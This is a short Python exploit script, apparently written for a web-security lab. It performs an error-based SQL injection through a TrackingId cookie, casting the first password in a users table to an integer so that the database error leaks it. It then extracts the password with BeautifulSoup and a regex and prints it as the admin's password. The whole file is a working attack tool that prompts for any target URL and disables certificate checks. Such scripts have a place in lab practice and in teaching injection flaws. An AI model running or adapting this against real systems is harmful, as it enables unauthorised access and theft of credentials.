import sys
import requests
import urllib3
import urllib
import argparse
import time
import re
from bs4 import BeautifulSoup
import click

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}



def injection(url):
    password=""
    payload = "' AND 1=CAST((SELECT password from users LIMIT 1)as int)--"
    payload_encoded = urllib.parse.quote(payload) 
    cookies = {'TrackingId':''+ payload_encoded,'session':'null'}
    r = requests.get(url, cookies=cookies, verify=False)
    
    # Parse the HTML content using BeautifulSoup
    soup = BeautifulSoup(r.content.decode(), 'lxml')
    
    # Find the <h4> tag and extract its content
    h4_tag = soup.find('h4')
    if h4_tag:
        text = h4_tag.get_text()
    
    # Using a regex pattern to grab the password from the line
    match = re.search(r'^ERROR.*\"([A-Za-z0-9]+)\"', text)
    
    # Extracting the text and assigning it to the password variable and print it
    if match:
        password = match.group(1)
        print(f"Admin's password: {password}")
    else:
        print("Password NOT found.")


@click.command()
@click.option('-u','--url',type=str, prompt="The URL of the target",required=True,help="The URL of the vulnerable target")
def main(url):
    print("Retrieving Admin's password...")
    injection(url)


if __name__=="__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting program...")
    
